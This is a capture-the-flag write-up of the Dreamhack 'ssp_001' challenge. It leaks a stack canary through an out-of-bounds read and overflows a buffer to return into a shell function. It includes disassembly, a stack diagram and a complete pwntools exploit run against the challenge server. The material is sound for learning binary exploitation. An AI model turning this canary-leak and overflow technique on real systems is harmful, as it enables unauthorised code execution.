---
title: "[DREAMHACK] - ssp_001"
published: 2025-01-30
description: ""
image: "../image.png"
tags:
  - PWN
category: "Wargame"
draft: false
---

## Analysis

### General information

```bash
[*] '/home/alter/Dreamhack/ssp_001/ssp_001'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

### Source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}
void get_shell() {
    system("/bin/sh");
}
void print_box(unsigned char *box, int idx) {
    printf("Element of index %d is : %02x\\n", idx, box[idx]);
}
void menu() {
    puts("[F]ill the box");
    puts("[P]rint the box");
    puts("[E]xit");
    printf("> ");
}
int main(int argc, char *argv[]) {
    unsigned char box[0x40] = {};
    char name[0x40] = {};
    char select[2] = {};
    int idx = 0, name_len = 0;
    initialize();
    while(1) {
        menu();
        read(0, select, 2);
        switch( select[0] ) {
            case 'F':
                printf("box input : ");
                read(0, box, sizeof(box));
                break;
            case 'P':
                printf("Element index : ");
                scanf("%d", &idx);
                print_box(box, idx);
                break;
            case 'E':
                printf("Name Size : ");
                scanf("%d", &name_len);
                printf("Name : ");
                read(0, name, name_len);
                return 0;
            default:
                break;
        }
    }
}
```

So if we look at the source code we can see that in the main function, we can be able to input a option to each category

Let's run the binary and see how it works:

```bash
➜  ssp_001 ./ssp_001
[F]ill the box
[P]rint the box
[E]xit
> F
box input : hello
[F]ill the box
[P]rint the box
[E]xit
> P
Element index : 2
Element of index 2 is : 6c
[F]ill the box
[P]rint the box
[E]xit
> E
Name Size : 1
Name : HHHHHHH

```

There is a special here that the `[P]rint the box` show us the hex of that index element. And that's how this code works:

```c
void print_box(unsigned char *box, int idx) {
    printf("Element of index %d is : %02x\\n", idx, box[idx]);
}
```

Look closely we can see that `box[idx]` is the same as `*(box + idx)` where `box` is the `base address` of our input in option `[F]ill the box`[F]ill the box. So the idea here is we can use that to leak the address of the Canary (we need to find the offset between `box` and `canary`)

### Debugging with GDB

We need to look at the disassembly to know which locations of each variable is:

```nasm
   0x0804872b <+0>:     push   ebp
   0x0804872c <+1>:     mov    ebp,esp
   0x0804872e <+3>:     push   edi
   0x0804872f <+4>:     sub    esp,0x94
   0x08048735 <+10>:    mov    eax,DWORD PTR [ebp+0xc]
   0x08048738 <+13>:    mov    DWORD PTR [ebp-0x98],eax
   0x0804873e <+19>:    mov    eax,gs:0x14
   0x08048744 <+25>:    mov    DWORD PTR [ebp-0x8],eax
   0x08048747 <+28>:    xor    eax,eax
   0x08048749 <+30>:    lea    edx,[ebp-0x88]
   0x0804874f <+36>:    mov    eax,0x0
   0x08048754 <+41>:    mov    ecx,0x10
   0x08048759 <+46>:    mov    edi,edx
   0x0804875b <+48>:    rep stos DWORD PTR es:[edi],eax
   0x0804875d <+50>:    lea    edx,[ebp-0x48]
   0x08048760 <+53>:    mov    eax,0x0
   0x08048765 <+58>:    mov    ecx,0x10
   0x0804876a <+63>:    mov    edi,edx
   0x0804876c <+65>:    rep stos DWORD PTR es:[edi],eax
   0x0804876e <+67>:    mov    WORD PTR [ebp-0x8a],0x0
   0x08048777 <+76>:    mov    DWORD PTR [ebp-0x94],0x0
   0x08048781 <+86>:    mov    DWORD PTR [ebp-0x90],0x0
   0x0804878b <+96>:    call   0x8048672 <initialize>
   0x08048790 <+101>:   call   0x80486f1 <menu>
   0x08048795 <+106>:   push   0x2
   0x08048797 <+108>:   lea    eax,[ebp-0x8a]
   0x0804879d <+114>:   push   eax
   0x0804879e <+115>:   push   0x0
   0x080487a0 <+117>:   call   0x80484a0 <read@plt>
   0x080487a5 <+122>:   add    esp,0xc
   0x080487a8 <+125>:   movzx  eax,BYTE PTR [ebp-0x8a]
   0x080487af <+132>:   movsx  eax,al
   0x080487b2 <+135>:   cmp    eax,0x46
   0x080487b5 <+138>:   je     0x80487c6 <main+155>
   0x080487b7 <+140>:   cmp    eax,0x50
   0x080487ba <+143>:   je     0x80487eb <main+192>
   0x080487bc <+145>:   cmp    eax,0x45
   0x080487bf <+148>:   je     0x8048824 <main+249>
   0x080487c1 <+150>:   jmp    0x804887a <main+335>
   0x080487c6 <+155>:   push   0x804896c
   0x080487cb <+160>:   call   0x80484b0 <printf@plt>
   0x080487d0 <+165>:   add    esp,0x4
   0x080487d3 <+168>:   push   0x40
   0x080487d5 <+170>:   lea    eax,[ebp-0x88]
   0x080487db <+176>:   push   eax
   0x080487dc <+177>:   push   0x0
   0x080487de <+179>:   call   0x80484a0 <read@plt>
   0x080487e3 <+184>:   add    esp,0xc
   0x080487e6 <+187>:   jmp    0x804887a <main+335>
   0x080487eb <+192>:   push   0x8048979
   0x080487f0 <+197>:   call   0x80484b0 <printf@plt>
   0x080487f5 <+202>:   add    esp,0x4
   0x080487f8 <+205>:   lea    eax,[ebp-0x94]
   0x080487fe <+211>:   push   eax
   0x080487ff <+212>:   push   0x804898a
   0x08048804 <+217>:   call   0x8048540 <__isoc99_scanf@plt>
   0x08048809 <+222>:   add    esp,0x8
   0x0804880c <+225>:   mov    eax,DWORD PTR [ebp-0x94]
   0x08048812 <+231>:   push   eax
   0x08048813 <+232>:   lea    eax,[ebp-0x88]
   0x08048819 <+238>:   push   eax
   0x0804881a <+239>:   call   0x80486cc <print_box>
   0x0804881f <+244>:   add    esp,0x8
   0x08048822 <+247>:   jmp    0x804887a <main+335>
   0x08048824 <+249>:   push   0x804898d
   0x08048829 <+254>:   call   0x80484b0 <printf@plt>
   0x0804882e <+259>:   add    esp,0x4
   0x08048831 <+262>:   lea    eax,[ebp-0x90]
   0x08048837 <+268>:   push   eax
   0x08048838 <+269>:   push   0x804898a
   0x0804883d <+274>:   call   0x8048540 <__isoc99_scanf@plt>
   0x08048842 <+279>:   add    esp,0x8
   0x08048845 <+282>:   push   0x804899a
   0x0804884a <+287>:   call   0x80484b0 <printf@plt>
   0x0804884f <+292>:   add    esp,0x4
   0x08048852 <+295>:   mov    eax,DWORD PTR [ebp-0x90]
   0x08048858 <+301>:   push   eax
   0x08048859 <+302>:   lea    eax,[ebp-0x48]
   0x0804885c <+305>:   push   eax
   0x0804885d <+306>:   push   0x0
   0x0804885f <+308>:   call   0x80484a0 <read@plt>
   0x08048864 <+313>:   add    esp,0xc
   0x08048867 <+316>:   mov    eax,0x0
   0x0804886c <+321>:   mov    edx,DWORD PTR [ebp-0x8]
   0x0804886f <+324>:   xor    edx,DWORD PTR gs:0x14
   0x08048876 <+331>:   je     0x8048884 <main+345>
   0x08048878 <+333>:   jmp    0x804887f <main+340>
   0x0804887a <+335>:   jmp    0x8048790 <main+101>
   0x0804887f <+340>:   call   0x80484e0 <__stack_chk_fail@plt>
   0x08048884 <+345>:   mov    edi,DWORD PTR [ebp-0x4]
   0x08048887 <+348>:   leave
   0x08048888 <+349>:   ret
```

The output show us the location of `stack canary` is `[ebp-0x8]`

```nasm
   0x0804873e <+19>:    mov    eax,gs:0x14
   0x08048744 <+25>:    mov    DWORD PTR [ebp-0x8],eax
```

So we have 1, 1 fact, just find the rest

```nasm
0x08048795 <+106>:   push   0x2                   # push 2
0x08048797 <+108>:   lea    eax,[ebp-0x8a]        # eax = select (*)
0x0804879d <+114>:   push   eax                   # push select
0x0804879e <+115>:   push   0x0                   # push 0
0x080487a0 <+117>:   call   0x80484a0 <read@plt>  # read(0, select, 2)
0x080487a5 <+122>:   add    esp,0xc

0x080487d3 <+168>:   push   0x40                    # push 0x40
0x080487d5 <+170>:   lea    eax,[ebp-0x88]          # eax = box (*)
0x080487db <+176>:   push   eax                     # push box
0x080487dc <+177>:   push   0x0                     # push 0
0x080487de <+179>:   call   0x80484a0 <read@plt>    # read(0, box, 0x40)
0x080487e3 <+184>:   add    esp,0xc

0x080487f8 <+205>:   lea    eax,[ebp-0x94]                  # eax = idx (*)
0x080487fe <+211>:   push   eax                             # push idx
0x080487ff <+212>:   push   0x804898a                       # %d
0x08048804 <+217>:   call   0x8048540 <__isoc99_scanf@plt>  # scanf("%d", &idx)
0x08048809 <+222>:   add    esp,0x8

0x08048852 <+295>:   mov    eax,DWORD PTR [ebp-0x90]  # eax = name_len (*)
0x08048858 <+301>:   push   eax                       # push name_len
0x08048859 <+302>:   lea    eax,[ebp-0x48]            # eax = name (*)
0x0804885c <+305>:   push   eax                       # push name
0x0804885d <+306>:   push   0x0                       # push 0x0
0x0804885f <+308>:   call   0x80484a0 <read@plt>      # read(0, name, name_len)
0x08048864 <+313>:   add    esp,0xc
```

So include we have:
`select` = `[ebp-0x8a]box` = `[ebp-0x88]idx` = `[ebp-0x94]name` = `[ebp-0x48]name_len` = `[ebp-0x90]canary` = `[ebp-0x8]`

- Stack will look like this:

```
+---------------+
|     idx       |
|---------------|
|   name_len    |
|---------------|
|    select     |
|---------------|  <--- 0x88
|               |
|      box      |
|               |
|---------------|  <--- 0x48
|               |
|     name      |
|               |
|---------------| <--- 0x8
|     canary    |
|---------------|
|     dummy     |
|---------------|
|      RIP      |
|---------------|
```

So depend on our input field, I see that `name` is the second highest address in the stack. So that I have and idea is give our payload to this `name` function for it to overflow and overwrite the RIP with `get_shell()` function

But first we need to brute force the Stack Canary value:

- As mentioned before we can use P option to extract hex index from an element so we can use it to extract. For example:

```bash
➜  ssp_001 ./ssp_001
[F]ill the box
[P]rint the box
[E]xit
> P
Element index : 128
Element of index 128 is : 00
[F]ill the box
[P]rint the box
[E]xit
> P
Element index : 129
Element of index 129 is : 2f
[F]ill the box
[P]rint the box
[E]xit
> P
Element index : 130
Element of index 130 is : ae
[F]ill the box
[P]rint the box
[E]xit
> P
Element index : 131
Element of index 131 is : 4c
```

So we can brute force by using this:

```python
stack_canary = ""
for i in [131, 130, 129, 128]:
        p.sendlineafter(b"> ", b"P")
        p.sendlineafter(b"Element index : ", str(i).encode())
        p.recvuntil(b"is : ")
        stack_canary_byte = p.recvn(0x2).decode('utf-8')
        print('Byte: ', stack_canary_byte)
        stack_canary += stack_canary_byte
```

And our payload is calculate like this:  `A * 0x40 + canary + dummy (0x8) + get_shell()`

## Exploit

```python
#!/usr/bin/python3

from pwn import *

# context.log_level = 'debug'
exe = context.binary = ELF('./ssp_001', checksec=False)

# Shorthanding functions for input/output
info = lambda msg: log.info(msg)
s = lambda data: p.send(data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())

def slog(name, addr):
  return success(": ".join([name, hex(addr)]))

# GDB scripts for debugging
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

c
''')

p = remote('host3.dreamhack.games',24408) if args.REMOTE else process(argv=[exe.path], aslr=False)
if args.GDB:
    GDB()
    input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

# Use when leaked is needed
# p.recvuntil(b'at: ')
# stack_leak = int(p.recvuntil(b'.', drop=True), 16) # Adjust this
# info("Stack leak: " + hex(stack_leak))

stack_canary = ""
for i in [131, 130, 129, 128]:
        p.sendlineafter(b"> ", b"P")
        p.sendlineafter(b"Element index : ", str(i).encode())
        p.recvuntil(b"is : ")
        stack_canary_byte = p.recvn(0x2).decode('utf-8')
        print('Byte: ', stack_canary_byte)
        stack_canary += stack_canary_byte

stack_canary = int(stack_canary, 16)
slog("Canary leak", stack_canary)

pl = b'A' * 0x40
pl += p32(stack_canary) # 4 bytes
pl += b'A' * 8
pl += p32(exe.sym['get_shell']) # 4 bytes

sla(b'>', b'E')
sla(b"Size : ", str(1000).encode())
sla(b"Name : ", pl)

p.interactive()

```

```bash
➜  ssp_001 python3 exploit.py REMOTE
[+] Opening connection to host3.dreamhack.games on port 24408: Done
Byte:  d4
Byte:  a6
Byte:  13
Byte:  00
[+] Canary leak: 0xd4a61300
[*] Switching to interactive mode
$ ls
flag
run.sh
ssp_001

```
